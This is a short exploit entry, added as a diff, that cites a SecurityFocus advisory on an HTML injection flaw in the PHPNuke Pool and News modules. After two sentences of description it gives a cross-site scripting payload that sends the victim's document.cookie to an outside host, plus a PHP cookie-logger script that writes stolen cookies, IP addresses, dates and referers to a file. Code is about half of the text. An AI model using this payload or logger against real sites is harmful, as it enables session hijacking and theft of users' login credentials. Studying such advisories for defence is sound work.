@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/16192/info
+
+The PHPNuke Pool and News Modules are prone to an HTML injection vulnerability. This issue is due to a failure in the application modules to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible. 
+
+<img src="javascript:window.navigate('http://www.example.com/cookies.php?c='+document.cookie);"
+
+cookies.php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('steal.php', 'a');
+fwrite($fp, '
+Cookie: '.$cookie.'
+IP: ' .$ip. '
+Date and Time: ' .$date. '
+Referer: '.$referer.' ');
+fclose($fp);
+?> 
